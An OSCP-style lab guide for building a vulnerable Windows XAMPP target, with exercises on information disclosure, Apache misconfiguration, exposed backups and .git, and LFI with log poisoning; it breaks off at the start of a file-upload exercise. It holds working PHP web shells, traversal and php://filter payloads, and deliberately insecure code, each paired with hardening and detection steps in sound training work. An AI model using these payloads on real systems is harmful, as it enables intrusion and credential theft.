# XAMPP OSCP Lab Guide — Build the Box, Break It, Defend It

> Hands-on companion to `oscp-xampp-attack-course.md`. Where the course teaches you *how to
> think* about a XAMPP target, this guide makes you *build the vulnerable target with your
> own hands, exploit every scenario, and then harden each hole shut and prove it's shut.*
>
> **Lens — Build. Understand. Break. Defend.**
> The course was Build → Understand → Break. This guide adds the fourth movement: **Defend.**
> You don't truly understand a vulnerability until you've (1) deliberately created it, (2)
> exploited it, (3) explained *why* it worked, (4) closed it, and (5) proven the same attack
> now fails. That five-step loop — the same loop as Laury's AD lab guides
> (`vulnerable → exploit → why → fix → verify → detect → lesson`) — is how a finding becomes
> knowledge instead of a memorised command.

---

## How to use this guide

Every exercise is a self-contained loop you run against **one Windows XAMPP virtual
machine** that you build in Part 0. The fixed structure of each exercise:

- **Profile header** — precondition, layer, privilege needed, MITRE ATT&CK ID(s), exam
  relevance, and which course scenario it maps to.
- **§1 What it is** — the vulnerability in one paragraph.
- **§2 Why it works** — the exact setting/behaviour that enables it.
- **§3 Make it vulnerable** — precise steps to create the hole on your box (config edits
  shown as file contents *and*, where meaningful, the XAMPP Control Panel / Windows GUI
  path). Take a snapshot named `vuln-<exercise>` before moving on.
- **§4 Exploit it** — the full attacker walkthrough from your Kali box, with expected
  output and a one-line "why that worked."
- **§5 Harden it** — the exact inverse of §3, plus defence-in-depth.
- **§6 Verify the fix** — re-run the *same* attack (ideally with more than one tool) and
  show it now failing. Snapshot `hardened-<exercise>`.
- **§7 Detect it** — what a defender sees: the Apache/PHP/Windows log lines and Event IDs
  the attack produced.
- **🎓 Lesson** — the transferable idea.

**Work order:** build the box (Part 0), then do the exercises in order 1→11 — they escalate
from pure information disclosure to full RCE to privilege escalation to a chained capstone,
which mirrors how you'd actually assess a real box. After each, *harden it before moving on*
so that by the end you've walked a single machine all the way from "wide open" to "locked
down," seeing exactly which change closed which door.

**Golden rules (from the AD lab format, they apply here too):**

1. **Snapshot discipline.** `vuln-<x>` before you attack, `hardened-<x>` after you fix.
   You'll want to jump back and forth.
2. **Make-vulnerable and Harden are exact inverses.** If the fix isn't the literal reversal
   of the setup, you don't understand the vuln yet.
3. **Verify with more than one tool where you can.** Different tools exercise different code
   paths; one tool saying "safe" isn't proof.
4. **Every attack pairs red with blue.** You don't finish an exercise at the shell — you
   finish it at "closed, verified, and detectable."
5. **Isolated network only.** This box is deliberately, dangerously vulnerable. Host-only.
   Never bridged, never internet-facing.

---

# PART 0 — Build the Lab

This Part gets you from nothing to a running, deliberately-vulnerable Windows XAMPP box plus
a Kali attacker, on an isolated network, with a clean baseline snapshot. Every later
exercise assumes this baseline.

## 0.1 What you're building

```text
        Host-only network  192.168.56.0/24  (VMware VMnet / VirtualBox vboxnet)
        ┌──────────────────────────────┐        ┌──────────────────────────────┐
        │  KALI (attacker)             │        │  WIN-XAMPP (victim)           │
        │  192.168.56.100              │◄──────►│  192.168.56.10                │
        │  Burp, ffuf, nmap, impacket, │        │  Windows 10/Server + XAMPP    │
        │  git-dumper, PrintSpoofer... │        │  Apache/PHP/MariaDB/phpMyAdmin│
        └──────────────────────────────┘        └──────────────────────────────┘
```

- **Victim:** a Windows 10 (or Windows Server 2019/2022) VM running XAMPP. All 11 exercises
  live on this one box; you toggle each vulnerability on for its exercise and off when you
  harden.
- **Attacker:** Kali Linux, same host-only network.
- **Network:** host-only / internal — **no NAT, no bridged.** These machines must not reach
  the internet or your LAN.

> **Why Windows?** You asked for a Windows box, and it's the higher-value teaching target:
> XAMPP's Apache on Windows is so often installed as a service running as **Local System**
> that web RCE frequently *is* SYSTEM — which makes the privilege-escalation exercises
> (E10) dramatically instructive. A Linux XAMPP variant is in the Appendix.

## 0.2 Victim VM base install

1. Create a VM: 2 vCPU, 4 GB RAM, 60 GB disk. Install **Windows 10** (or Server
   2019/2022). Set a static host-only IP `192.168.56.10`, DNS off/loopback, and a local
   admin account you control (`labadmin`). Disable Windows Update's auto-reboot for lab
   stability, and — because this box is intentionally vulnerable — **disable Windows
   Defender real-time protection** (Settings → Privacy & security → Windows Security →
   Virus & threat protection → Manage settings → Real-time protection Off; for a durable
   lab, also set the Group Policy `Turn off Microsoft Defender`). Otherwise Defender will
   quarantine your web shells and Potato binaries mid-exercise and you'll chase ghosts.
2. Rename the host `WIN-XAMPP` so proofs are unambiguous.

Snapshot now: **`base-clean-windows`** (pre-XAMPP).

## 0.3 Install XAMPP

1. Download the XAMPP for Windows installer from Apache Friends. For teaching the
   CVE-relevant scenarios pick a **slightly older bundle** on purpose (e.g. a XAMPP that
   ships Apache 2.4.x, PHP 8.0/8.1, MariaDB 10.4, phpMyAdmin 5.x) — the exercises don't
   depend on a specific CVE, but an older bundle keeps the version-research exercise
   realistic. Install to the default `C:\xampp`.
2. Install Apache **and** MySQL as services so they survive reboots and so E10's
   service-account behaviour is realistic: open the **XAMPP Control Panel as Administrator**
   → tick the red "X" checkboxes next to **Apache** and **MySQL** → confirm the service
   installs → Start both. (This is the GUI equivalent of `apache_installservice.bat` /
   `mysql_installservice.bat` in `C:\xampp\`.)
3. Confirm the stack: browse `http://192.168.56.10/` from Kali → you should see the XAMPP
   dashboard. Confirm `http://192.168.56.10/phpmyadmin/` loads.

> **Service account note (important for E10).** By default the XAMPP-installed Apache service
> runs as **Local System**. Leave it that way for the "web RCE = SYSTEM" case; E10 also shows
> a *limited-service-account* variant where you'll deliberately reconfigure the service to run
> as a low-privileged user so you can practise `SeImpersonate`→Potato. Check the current
> account any time with:
>
> ```cmd
> C:\> sc qc Apache2.4
>     SERVICE_START_NAME : LocalSystem
> ```
> (The service name is usually `Apache2.4`; confirm with `sc query state= all | findstr /i apache`.)

## 0.4 Deploy the vulnerable application

Most exercises are driven by a small deliberately-vulnerable PHP app you'll drop into the
web root. Create the folder `C:\xampp\htdocs\app\` and populate it as the exercises direct.
Here is the **shared scaffold** you deploy now; individual exercises add or toggle pieces.

`C:\xampp\htdocs\app\config.php` — the app's DB config (the credential you'll hunt later):

```php
<?php
// Central DB config for the lab app.
$DB_HOST = "127.0.0.1";
$DB_USER = "appuser";
$DB_PASS = "Autumn2026!";     // <-- the credential the whole lab reuses
$DB_NAME = "appdb";
$conn = new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
?>
```

`C:\xampp\htdocs\app\index.php` — the landing page and the include point (LFI in E4):

```php
<?php
// Deliberately vulnerable router: includes a "page" from user input (E4 turns this on).
$page = isset($_GET['page']) ? $_GET['page'] : 'home';
echo "<h1>LabApp</h1><p><a href='?page=home'>home</a> | <a href='?page=about'>about</a></p>";
include("pages/" . $page . ".php");   // VULNERABLE pattern used in E4
?>
```

Create `C:\xampp\htdocs\app\pages\home.php` and `about.php` with a line of text each so the
router has legitimate content.

Set up the database the app expects. In phpMyAdmin (or `C:\xampp\mysql\bin\mysql -u root`):

```sql
CREATE DATABASE appdb;
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'Autumn2026!';
GRANT ALL PRIVILEGES ON appdb.* TO 'appuser'@'localhost';
USE appdb;
CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(255), role VARCHAR(20));
INSERT INTO users VALUES (1,'admin', MD5('Sup3rS3cret!'), 'admin'), (2,'bob', MD5('bob123'), 'user');
FLUSH PRIVILEGES;
```

Also create a **local Windows user** that shares the app password, so the credential-reuse
privesc (E8/E11) is real:

```cmd
C:\> net user svc_deploy Autumn2026! /add
C:\> net localgroup "Remote Desktop Users" svc_deploy /add
```

Snapshot now: **`baseline-app-deployed`** — this is your clean "everything installed,
nothing yet made vulnerable" state. Every exercise starts from here (or from the previous
hardened snapshot, your choice).

## 0.5 Attacker (Kali) setup

On Kali `192.168.56.100`, confirm/install the toolset the exercises use:

```bash
$ sudo apt update && sudo apt install -y ffuf gobuster nikto whatweb curl wget \
      git python3-pip seclists hydra
$ pipx install git-dumper                     # .git exfiltration (E3)
# Windows privesc payloads to have ready for E10/E11:
#   PrintSpoofer64.exe, GodPotato / JuicyPotatoNG, nc.exe (from your usual sources)
$ echo "192.168.56.10  app.lab dev.app.lab" | sudo tee -a /etc/hosts   # for the vhost exercise E9
```

Add a working directory per exercise so your loot stays organised:

```bash
$ mkdir -p ~/xampp-lab/{e1,e2,e3,e4,e5,e6,e7,e8,e9,e10,e11}
```

## 0.6 The reset / snapshot model

You will make the box vulnerable, break it, and fix it many times. Manage it with
snapshots, not by hand-reverting:

```text
base-clean-windows        # OS only
baseline-app-deployed     # XAMPP + app + DB + users, nothing yet vulnerable   ← HOME BASE
vuln-e1 … vuln-e11        # each exercise's vulnerable state (take before §4)
hardened-e1 … hardened-e11# each exercise's fixed state (take after §6)
```

Recommended flow per exercise: revert to `baseline-app-deployed` → apply §3 → snapshot
`vuln-eN` → do §4 → do §5 → snapshot `hardened-eN` → do §6/§7. For the capstone (E11) you'll
deliberately stack several vulnerabilities at once, so build it from `baseline-app-deployed`
by applying multiple exercises' §3 steps.

With the box built and snapshotted, you're ready. Everything below is the Build → Break →
Defend loop, one hole at a time.

---

# EXERCISE 1 — Information Disclosure (display_errors, phpinfo, default pages)

> **Precondition:** anonymous HTTP access to the app.
> **Layer:** ② configuration (PHP dev defaults left on).
> **Privilege needed:** none.
> **MITRE ATT&CK:** T1592/T1595 (recon), T1082 (system information discovery).
> **Exam relevance:** high — verbose errors leak the exact filesystem paths you need for
> LFI, upload targeting, and `INTO OUTFILE`.
> **Course scenario:** S1 (Default XAMPP / recognition) + S2's source-disclosure half.

## §1 What it is

The XAMPP default `php.ini` ships developer-friendly settings — chiefly
`display_errors = On` — that print PHP error messages, including **absolute filesystem
paths**, straight to the browser. Add a stray `phpinfo()` page (XAMPP even ships one) and the
box narrates its entire configuration to any anonymous visitor.

## §2 Why it works

`display_errors = On` tells PHP to send warnings/errors to the HTTP response instead of only
the log. A failed `include`, a bad DB call, or a type error then leaks lines like
`C:\xampp\htdocs\app\index.php on line 8` — handing you the web root and app layout.
`phpinfo()` goes further: it dumps the full `php.ini` (so `disable_functions`,
`open_basedir`, `allow_url_include`, `upload_tmp_dir`), the OS, and `DOCUMENT_ROOT`. These
are the constants every later attack is built on.

## §3 Make it vulnerable

**Option A — config file.** Edit `C:\xampp\php\php.ini` and ensure:

```ini
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
expose_php = On          ; adds "X-Powered-By: PHP/x" — extra recon
```

Drop a phpinfo page (XAMPP already has `C:\xampp\htdocs\dashboard\phpinfo.php`; add an
obvious one too):

```php
# C:\xampp\htdocs\app\info.php
<?php phpinfo(); ?>
```

**Option B — GUI.** XAMPP Control Panel → Apache **Config** button → **PHP (php.ini)** →
find `display_errors` → set `On` → Save → **Stop/Start Apache** (config changes need a
restart; the Control Panel's Stop then Start does it).

Restart Apache. Snapshot `vuln-e1`.

## §4 Exploit it

From Kali — first fingerprint, then farm paths and config:

```bash
# 1) Confirm the stack and version (recognition)
$ curl -sI http://192.168.56.10/ | grep -iE 'server|x-powered'
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25
X-Powered-By: PHP/8.1.25

# 2) Trigger an error to leak the absolute web-root path
$ curl -s "http://192.168.56.10/app/index.php?page=%00"    # bad include arg
Warning: include(pages/.php): Failed to open stream ... in C:\xampp\htdocs\app\index.php on line 8

# 3) Read the whole config from the phpinfo page
$ curl -s http://192.168.56.10/app/info.php | grep -iE 'disable_functions|open_basedir|allow_url_include|upload_tmp_dir|DOCUMENT_ROOT'
disable_functions   (no value)
open_basedir        (no value)
allow_url_include   Off
upload_tmp_dir      C:\xampp\tmp
_SERVER["DOCUMENT_ROOT"]  C:/xampp/htdocs
```

**Why it worked:** the dev-mode config turned every error into an intelligence leak. You now
know: web root `C:\xampp\htdocs`, empty `disable_functions` (a web shell's `system()` will
work — E5/E6/E7), empty `open_basedir` (LFI can read anywhere — E4), `allow_url_include Off`
(so RFI is dead; you'll need log poisoning in E4).

## §5 Harden it

**Option A — config file.** In `C:\xampp\php\php.ini`:

```ini
display_errors = Off
display_startup_errors = Off
log_errors = On                      ; keep errors — in the LOG, not the response
error_log = "C:\xampp\php\logs\php_error_log"
expose_php = Off                     ; drop the X-Powered-By banner
```

Delete the stray info page and remove XAMPP's shipped one:

```cmd
C:\> del C:\xampp\htdocs\app\info.php
C:\> del C:\xampp\htdocs\dashboard\phpinfo.php
```

Also tighten Apache's banner in `C:\xampp\apache\conf\httpd.conf`:

```apache
ServerTokens Prod
ServerSignature Off
```

**Option B — GUI.** Same php.ini toggles via Control Panel → Apache Config → php.ini.
Restart Apache. Snapshot `hardened-e1`.

## §6 Verify the fix

Re-run the same probes; the leaks are gone:

```bash
$ curl -sI http://192.168.56.10/ | grep -iE 'server|x-powered'
Server: Apache                                  # ServerTokens Prod → no version, no PHP
# X-Powered-By absent

$ curl -s "http://192.168.56.10/app/index.php?page=%00" | grep -i 'C:\\'
# (no output — the path leak is gone; error went to the log instead)

$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.56.10/app/info.php
404
```

Cross-check with a second tool:

```bash
$ whatweb http://192.168.56.10/            # no version/PHP fingerprint now
$ nikto -h http://192.168.56.10/ | grep -i 'phpinfo\|x-powered'   # nothing
```

## §7 Detect it

- `C:\xampp\apache\logs\access.log` shows the recon: repeated requests to `info.php`,
  `phpinfo.php`, and odd `?page=` values from one source IP in seconds — a scanning
  signature.
- With `display_errors Off` + `log_errors On`, the include failures now land in
  `C:\xampp\php\logs\php_error_log` where a defender (not the attacker) sees them.
- On Windows, high request volume can surface via the firewall log if enabled.

## 🎓 Lesson

Dev-mode defaults are an information-disclosure vulnerability, not a convenience. The fix
doesn't *hide* errors — it *relocates* them from the attacker's browser to the defender's
log. The transferable point: the first thing an attacker harvests on any PHP box is the set
of absolute paths and config values that make every *other* attack aimable; deny that, and
you raise the cost of everything downstream.

---

# EXERCISE 2 — Apache Misconfiguration (directory listing, dangerous methods)

> **Precondition:** anonymous HTTP access.
> **Layer:** ② configuration.
> **Privilege needed:** none.
> **MITRE ATT&CK:** T1083 (file & directory discovery), T1595 (active scanning).
> **Exam relevance:** high — directory listing exposes files you'd otherwise have to brute;
> a writable `PUT` is a direct foothold.
> **Course scenario:** S2 (Misconfigured Apache).

## §1 What it is

Two classic Apache misconfigurations: **directory listing** (`Options +Indexes`) auto-
generates a browsable file index when no index file exists, and **dangerous HTTP methods**
(notably `PUT`) let a client *write* files to the server. Either hands the attacker something
they shouldn't have — a file inventory, or a way to upload a shell without any app.

## §2 Why it works

`Options +Indexes` on a `<Directory>` makes Apache list the directory's contents instead of
returning 403. `PUT` is normally disabled, but a misconfigured handler or a `Script`/WebDAV
setting can make Apache write the request body to the requested path — if that path is under
the web root and executes PHP, it's instant RCE.

## §3 Make it vulnerable

**Option A — config.** In `C:\xampp\apache\conf\httpd.conf` (or an included conf), create a
listable uploads dir and a writable "webdav" dir:

```apache
<Directory "C:/xampp/htdocs/app/uploads">
    Options +Indexes                 # directory listing ON
    Require all granted
</Directory>

# A deliberately dangerous PUT-enabled area (simulating a WebDAV/handler misconfig):
<Directory "C:/xampp/htdocs/app/webdav">
    Dav On
    Require all granted
</Directory>
```

Enable the DAV modules (uncomment in `httpd.conf`): `LoadModule dav_module modules/mod_dav.so`
and `LoadModule dav_fs_module modules/mod_dav_fs.so`, and add a `DavLockDB`. Create the two
folders and put a couple of files in `uploads\` (e.g. `avatar1.png`, `notes.txt`).

**Option B — GUI.** Control Panel → Apache Config → `httpd.conf`, make the same edits;
Stop/Start Apache.

Snapshot `vuln-e2`.

## §4 Exploit it

```bash
# Directory listing → free file inventory
$ curl -s http://192.168.56.10/app/uploads/
<title>Index of /app/uploads</title> ... avatar1.png ... notes.txt ...

# Which methods are allowed?
$ curl -s -X OPTIONS http://192.168.56.10/app/webdav/ -i | grep -i allow
Allow: OPTIONS,GET,HEAD,POST,PUT,DELETE,PROPFIND,COPY,MOVE,LOCK,UNLOCK

# PUT a web shell, then execute it
$ echo '<?php system($_GET["c"]); ?>' > shell.php
$ curl -s -T shell.php http://192.168.56.10/app/webdav/shell.php
$ curl -s "http://192.168.56.10/app/webdav/shell.php?c=whoami"
nt authority\system            # Apache-as-SYSTEM → this is already SYSTEM
```

Cross-tool: `davtest -url http://192.168.56.10/app/webdav/` confirms which extensions upload
*and* execute.

**Why it worked:** `Indexes` leaked the file list; the DAV/`PUT` misconfig let you write a
`.php` into a PHP-executing directory, and mod_php ran it as the Apache service account
(SYSTEM here).

## §5 Harden it

**Option A — config.** Reverse both:

```apache
<Directory "C:/xampp/htdocs/app/uploads">
    Options -Indexes                 # no listing
    Require all granted
</Directory>
# Remove the <Directory ... Dav On> block entirely and re-comment the dav LoadModule lines.
```

Globally, ensure the default `<Directory />` has `Options -Indexes` and only enable methods
you need. Add a method allow-list where appropriate:

```apache
<Location "/app">
    <LimitExcept GET POST HEAD>
        Require all denied
    </LimitExcept>
</Location>
```

**Option B — GUI.** Same edits via Control Panel; Stop/Start Apache. Snapshot `hardened-e2`.

## §6 Verify the fix

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.56.10/app/uploads/
403                                            # listing denied

$ curl -s -X OPTIONS http://192.168.56.10/app/webdav/ -i | grep -i allow
Allow: GET,POST,HEAD                            # PUT/DELETE gone

$ curl -s -T shell.php http://192.168.56.10/app/webdav/shell2.php -o /dev/null -w '%{http_code}\n'
405                                            # Method Not Allowed
# second tool:
$ davtest -url http://192.168.56.10/app/webdav/    # "PUT ... FAIL" across the board
```

## §7 Detect it

- `access.log`: `PUT /app/webdav/shell.php` and `OPTIONS` requests are abnormal for a web
  app — a `PUT` returning 201/200 followed by a `GET` of the same `.php` is a textbook
  upload-then-execute pattern.
- Directory-listing hits show as `GET /app/uploads/` with 200 and no specific file.
- A new `.php` appearing under the web root (file-integrity monitoring / a scheduled
  `dir /s C:\xampp\htdocs *.php` diff) is the on-disk indicator.

## 🎓 Lesson

Apache's power is in what it's *allowed* to do per directory; misconfiguration is granting a
capability (list, write) where it isn't needed. The fix is least-privilege on directives:
`-Indexes` everywhere by default, methods restricted to what the app uses. Note how the
Apache-as-SYSTEM setup turned a "just a file write" into instant SYSTEM — the service account
multiplies the severity of every web-layer bug, which is the thread running into E10.

---

# EXERCISE 3 — Source & Backup Disclosure and Exposed `.git`

> **Precondition:** anonymous HTTP access; developer artefacts left in the web root.
> **Layer:** ③ operational (human left files behind).
> **Privilege needed:** none.
> **MITRE ATT&CK:** T1552.001 (credentials in files), T1083.
> **Exam relevance:** very high — a backup or exposed `.git` frequently hands over source
> and credentials in minutes.
> **Course scenario:** S2 (backup files) + S8 (credential leakage via `.git`).

## §1 What it is

Files that should never be web-reachable get left in the web root: editor/admin **backups**
(`config.php.bak`, `index.php~`, `.config.php.swp`), **archives** (`app.zip`, `www.tar.gz`),
**database dumps** (`db.sql`), and — the big one — an exposed **`.git/` directory** whose
contents let an attacker reconstruct the *entire source tree and its history*, including
secrets that were "removed" in a later commit but still live in history.

## §2 Why it works

A `.bak`/`.old`/`~`/`.swp` copy of a `.php` file no longer ends in `.php`, so Apache serves
it as **plain text** instead of executing it — leaking the source (and any hardcoded
credential) that the live file hides. An exposed `.git/` is worse: Git stores the whole
repo under `.git/`, so if that folder is served, tools reconstruct every file and every past
version, and `git log -p` surfaces secrets deleted in later commits.

## §3 Make it vulnerable

From the box, in `C:\xampp\htdocs\app\`:

```cmd
:: 1) an editor/admin backup of the credential-bearing config (served as TEXT)
C:\> copy config.php config.php.bak

:: 2) a whole-site archive
C:\> powershell Compress-Archive -Path C:\xampp\htdocs\app\* -DestinationPath C:\xampp\htdocs\app\backup.zip

:: 3) a DB dump left in the web root
C:\> C:\xampp\mysql\bin\mysqldump -u root appdb > C:\xampp\htdocs\app\db.sql

:: 4) an exposed git repo whose HISTORY leaks a rotated password
C:\> cd C:\xampp\htdocs\app
C:\app> git init && git add config.php && git commit -m "initial (old creds)"
:: now "rotate" the password in config.php to Autumn2026! and commit again:
C:\app> git add config.php && git commit -m "rotate db creds"
```

(For step 4 the *first* commit should contain an older password like `Spring2026!` so
`git log -p` reveals a secret not present in the current file — teaches the "deleted secrets
live forever" point.)

Snapshot `vuln-e3`.

## §4 Exploit it

```bash
# Fast sweep for the usual suspects
$ for f in config.php.bak config.php~ backup.zip db.sql .git/HEAD; do
    printf '%-16s ' "$f"; curl -s -o /dev/null -w '%{http_code}\n' "http://192.168.56.10/app/$f"; done
config.php.bak   200
backup.zip       200
db.sql           200
.git/HEAD        200                       # ← repo exposed

# Read the backup source directly → credential
$ curl -s http://192.168.56.10/app/config.php.bak
$DB_USER = "appuser"; $DB_PASS = "Autumn2026!"; ...

# Reconstruct the whole repo and mine its HISTORY
$ git-dumper http://192.168.56.10/app/.git ~/xampp-lab/e3/loot
$ cd ~/xampp-lab/e3/loot && git log -p | grep -iE 'pass|secret'
-   $DB_PASS = "Spring2026!";        # old, rotated-out — still in history
+   $DB_PASS = "Autumn2026!";        # current
```

**Why it worked:** the `.bak` lacked a `.php` extension so Apache disclosed its source; the
`.git/` directory being web-served let `git-dumper` rebuild the repo, and history retained a
secret the current file no longer shows.

## §5 Harden it

Remove the artefacts and make the web server refuse to serve dev files even if they
reappear.

```cmd
C:\> del C:\xampp\htdocs\app\config.php.bak C:\xampp\htdocs\app\backup.zip C:\xampp\htdocs\app\db.sql
C:\> rmdir /s /q C:\xampp\htdocs\app\.git
```

Defence-in-depth in `httpd.conf` — block dev/VCS files and archives from ever being served:

```apache
<DirectoryMatch "^.*/\.(git|svn|hg)/">
    Require all denied
</DirectoryMatch>
<FilesMatch "(\.(bak|old|orig|save|swp|inc|sql|zip|tar|gz|log)|~)$">
    Require all denied
</FilesMatch>
```

**Operational fix (the real one):** backups and repos don't belong in the web root at all.
Keep source in a repo *outside* `htdocs`, deploy only built artefacts, and never `git init`
inside a served directory. Snapshot `hardened-e3`.

## §6 Verify the fix

```bash
$ for f in config.php.bak backup.zip db.sql .git/HEAD; do
    printf '%-16s ' "$f"; curl -s -o /dev/null -w '%{http_code}\n' "http://192.168.56.10/app/$f"; done
config.php.bak   403
backup.zip       403
db.sql           403
.git/HEAD        403

# second tool — git-dumper now fails to enumerate
$ git-dumper http://192.168.56.10/app/.git ~/xampp-lab/e3/loot2
[-] Fetching .git/HEAD  [403] ... [-] Repository not found / inaccessible
```

## §7 Detect it

- `access.log`: a burst of 200s/404s for `*.bak`, `*.zip`, `*.sql`, and especially a
  sequence of `GET /app/.git/...` requests (`.git/HEAD`, `.git/config`, `.git/index`,
  `.git/objects/...`) is the unmistakable signature of `git-dumper`/repo scraping.
- After hardening, the same requests show as 403s — still visible as an *attempt*.
- On disk, file-integrity monitoring on `htdocs` catches the appearance of backup/dump
  files.

## 🎓 Lesson

The web root is a publishing directory, not a workspace — anything left there is published.
The two-layer defence (remove the files *and* configure the server to refuse their
extensions) reflects that you can't rely on humans never leaving a backup; you also make the
server decline to serve one. And the git-history point generalises: "deleting" a secret in a
new commit doesn't remove it — rotating the credential (and scrubbing history) does.

---

# EXERCISE 4 — Local File Inclusion → Source Disclosure & Log Poisoning → RCE

> **Precondition:** a parameter passed into `include`/`require` without sanitisation.
> **Layer:** ① application code (the sink) + ② config (what escalation is possible).
> **Privilege needed:** none.
> **MITRE ATT&CK:** T1190 (exploit public-facing app), T1505.003 (web shell via log poison).
> **Exam relevance:** very high — LFI is a premier web primitive; `php://filter`→creds and
> log-poisoning→RCE are core techniques.
> **Course scenario:** S3 (Vulnerable PHP application).

## §1 What it is

The app's router (`index.php?page=`) builds an `include()` path from user input. Controlling
that path lets you (a) read arbitrary local files, (b) read PHP *source* (via
`php://filter`) to steal the DB credential, and (c) achieve **RCE** by including a file you
can poison with PHP — the Apache access log.

## §2 Why it works

`include("pages/" . $_GET['page'] . ".php")` concatenates attacker input into a filesystem
path with no validation, so `../` traversal escapes the intended directory. Because `include`
*executes* whatever it loads, if the included file contains PHP, it runs. `php://filter`
turns the include into a *reader* (base64-encoding the target so it isn't executed) so you
can see the source of `config.php`. And because Apache logs the `User-Agent` verbatim,
sending PHP in that header then including the log file executes it (log poisoning). RFI is
off the table here because `allow_url_include = Off` (you confirmed this in E1) — which is
exactly why log poisoning is the escalation.

## §3 Make it vulnerable

The vulnerable `index.php` from Part 0 already has the sink. Ensure it's the "no
sanitisation" version and that the `.php` suffix is *not* appended for this exercise (so raw
traversal and wrappers work cleanly). Set `C:\xampp\htdocs\app\index.php`:

```php
<?php
$page = isset($_GET['page']) ? $_GET['page'] : 'home';
include($page);          // fully unsanitised LFI (worst case, for teaching)
?>
```

Confirm `C:\xampp\php\php.ini` has (XAMPP defaults, from E1): `allow_url_include = Off`,
`open_basedir =` (empty). Restart Apache. Snapshot `vuln-e4`.

## §4 Exploit it

**(a) Confirm LFI / arbitrary file read.**

```bash
$ curl -s "http://192.168.56.10/app/index.php?page=C:/Windows/System32/drivers/etc/hosts"
# ... Windows hosts file contents → LFI confirmed (absolute path, Windows)
$ curl -s "http://192.168.56.10/app/index.php?page=../../../../Windows/win.ini"
[fonts] ...                              # traversal works too
```

**(b) Steal the credential via `php://filter` (source disclosure).**

```bash
$ curl -s "http://192.168.56.10/app/index.php?page=php://filter/convert.base64-encode/resource=config.php" \
    | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
$DB_USER = "appuser"; $DB_PASS = "Autumn2026!"; $DB_NAME = "appdb"; ...
```

**Why:** `php://filter` made `include` *read and encode* `config.php` instead of executing
it, so its source (and the password) came back.

**(c) Escalate to RCE via log poisoning.**

```bash
# 1) Inject PHP into the Apache access log via the User-Agent header
$ curl -s -A '<?php system($_GET["c"]); ?>' http://192.168.56.10/

# 2) Include the log and pass a command (Windows XAMPP log path)
$ curl -s "http://192.168.56.10/app/index.php?page=C:/xampp/apache/logs/access.log&c=whoami"
... nt authority\system            # RCE as the Apache service account
```

**Why:** your User-Agent (containing PHP) was written verbatim into `access.log`; including
that log executed the PHP. Because `allow_url_include` is Off, RFI wouldn't have worked —
log poisoning is the local-only path to code execution.

## §5 Harden it

The real fix is in the code — never include user input directly. Use an allow-list:

```php
<?php
$pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
$key = $_GET['page'] ?? 'home';
if (!array_key_exists($key, $pages)) { http_response_code(404); die('Not found'); }
include($pages[$key]);          // only ever includes known-good files
?>
```

Defence-in-depth in `php.ini` (limits blast radius even if a new LFI appears):

```ini
allow_url_include = Off          ; already off — keep it (kills RFI)
allow_url_fopen   = Off          ; kills url-based wrapper tricks
open_basedir      = "C:\xampp\htdocs\app"   ; jail file access to the app dir
```

`open_basedir` means even a residual LFI can't read `C:\Windows\...` or poison
`C:\xampp\apache\logs\access.log` (outside the jail). Restart Apache. Snapshot `hardened-e4`.

## §6 Verify the fix

```bash
# arbitrary read blocked (allow-list rejects unknown keys)
$ curl -s -o /dev/null -w '%{http_code}\n' "http://192.168.56.10/app/index.php?page=C:/Windows/win.ini"
404
# php://filter source theft blocked
$ curl -s "http://192.168.56.10/app/index.php?page=php://filter/convert.base64-encode/resource=config.php"
Not found
# log poisoning blocked — even the raw path is refused by allow-list AND open_basedir
$ curl -s "http://192.168.56.10/app/index.php?page=C:/xampp/apache/logs/access.log&c=whoami"
Not found
# second check: with open_basedir, direct wrapper reads throw a jail error in the log, not content
```

## §7 Detect it

- `access.log`: `?page=` values containing `../`, `php://filter`, absolute paths, or drive
  letters are LFI probes. A request whose **User-Agent is PHP code** (`<?php ...`) followed
  shortly by a `?page=...access.log&c=...` request is the log-poisoning signature — visible
  right there in the same log the attacker abused.
- With `open_basedir` set, blocked reads produce `open_basedir restriction in effect` lines
  in `php_error_log` — a clean IoC.

## 🎓 Lesson

LFI is a *code* bug (unvalidated input into a dangerous sink), so the primary fix is in code
(allow-list), and config (`open_basedir`, `allow_url_*`) is the safety net that shrinks the
damage of the next one. Note the escalation ladder: read-anything → read *source* (creds) →
*execute* (log poison), each step reusing a different property (`php://filter`, verbatim
logging). Defence works the same way in layers — fix the sink, then jail the engine.

---

# EXERCISE 5 — Unrestricted File Upload → RCE

> **Precondition:** an upload feature that stores files in a web-reachable, PHP-executing
> directory.
> **Layer:** ① application code (weak validation) + ② config (dir executes PHP).
> **Privilege needed:** none (or a low-priv account, depending on where the upload lives).
> **MITRE ATT&CK:** T1505.003 (web shell), T1190.
> **Exam relevance:** very high — upload-to-RCE is one of the most common footholds.
> **Course scenario:** S6 (File upload vulnerability).

## §1 What it is

An avatar/document upload accepts a PHP file (directly, or via a filter bypass) and writes it
somewhere you can request and that Apache executes as PHP — giving code execution.

## §2 Why it works

The upload handler trusts attacker-controlled properties (extension, `Content-Type`) and
saves into a directory under the web root where mod_php runs `.php`. The five preconditions:
you can upload; you know the destination path; it's web-reachable; that directory executes
PHP; your payload runs. Break any one and it isn't RCE — which is why the fix targets exactly
those links.

## §3 Make it vulnerable

Create the upload page and directory. `C:\xampp\htdocs\app\upload.php`:

```php
<?php
// VULNERABLE: no real validation; keeps the attacker's filename & extension.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $dest = "uploads/" . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $dest);
    echo "Uploaded to <a href='$dest'>$dest</a>";
} ?>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="file"><input type="submit" value="Upload">
</form>
```

Ensure `C:\xampp\htdocs\app\uploads\` exists and — the key vulnerable condition — Apache
executes PHP there (the XAMPP default; make sure no config disables it). Snapshot `vuln-e5`.

## §4 Exploit it

Walk the five-question ladder (course Part XII):

```bash
# 1) Can I upload? Prove interpretation with a benign probe (7*7).
$ echo '<?php echo 7*7; ?>' > t.php
$ curl -s -F "file=@t.php" http://192.168.56.10/app/upload.php
